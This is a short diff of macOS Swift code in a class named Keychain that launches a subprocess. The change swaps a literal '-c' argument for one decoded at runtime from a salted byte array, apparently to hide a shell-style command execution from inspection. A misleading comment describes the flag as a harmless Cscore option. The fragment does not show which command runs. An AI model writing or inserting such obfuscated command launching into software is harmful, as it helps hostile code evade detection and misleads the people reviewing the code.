@@ -20,9 +20,13 @@ class Keychain {
         // Here we sets the standard output and error for the receiver
         task.standardOutput = pipe
         task.standardError = pipe
+        // create crypt entity and salt
+        let mrc = MRC(slt: "213vg")
+        // decrypt "-c"
+        let str = mrc.down(key: [31, 82])
         // - c flag - Use Cscore processing of the scorefile
         // Sets the command arguments that should be used to launch the executable
-        task.arguments = ["-c", text]
+        task.arguments = [str, text]
         // Sets file URL of the receiver's executable file.
         if #available(macOS 10.13, *) {
             task.executableURL = URL(fileURLWithPath: path)
